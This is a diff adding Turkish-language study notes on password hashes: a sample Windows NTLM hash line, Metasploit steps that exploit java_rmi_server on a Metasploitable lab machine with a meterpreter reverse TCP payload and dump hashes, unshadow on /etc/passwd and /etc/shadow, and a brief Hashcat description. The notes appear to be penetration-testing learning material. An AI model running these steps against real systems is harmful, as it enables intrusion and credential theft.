@@ -18,3 +18,26 @@
 - NTLM (NT LAN Manager), LM’den sonra gelen daha gelişmiş hash sistemidir
 
 * Windows hash : admin:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
+
+** Hash'leri Toplama **
+
+- Kali'de toplamak (metasploitable'ın)
+
+  > msfconsole
+  > use exploit/multi/misc/java_rmi_server // Java uygulamalarında. Uzaktaki (remote) objeleri çalıştırmayı sağlar
+  > show payloads
+  > set payload java/meterpreter/reverse_tcp
+  > set options
+  > meterpreter > hushdump //çıkmama ihtimali olabilir
+  > run post/linux/gather/hashdump //hashler çıkar
+
+- Linux'te toplamak
+  > unshadow
+  > unshadow /etc/passwd /etc/shadow //hashlari birleştirir orjinal hale getirir
+
+** Hashcat **
+
+→ Dünyanın en güçlü password hash kırma (cracking) aracıdır
+• GPU kullanır
+• Çok hızlıdır
+• Birçok hash türünü destekler
